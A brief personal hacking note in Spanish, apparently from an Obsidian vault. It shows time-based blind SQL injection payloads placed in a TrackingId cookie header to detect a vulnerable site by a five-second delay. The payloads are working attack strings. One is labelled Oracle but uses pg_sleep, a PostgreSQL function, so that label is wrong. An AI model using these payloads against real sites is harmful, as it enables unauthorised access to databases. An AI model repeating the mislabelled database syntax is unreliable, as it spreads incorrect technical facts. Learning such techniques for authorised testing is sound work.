---
tags:
  - HackingTools
---
---
En caso sospechar por una SQLi podemos hacer lo siguiente 
```http
// En MySQL
Cookie: TrackingId=gdFX0T2vTzlEi85Q' and sleep(5)-- -;

// En oracle
Cookie: TrackingId=gdFX0T2vTzlEi85Q'||pg_sleep(5)-- -;

```

En caso de demorar los 5 segundos seria vulnerable a SQLi

![[Pasted image 20250111163435.png]]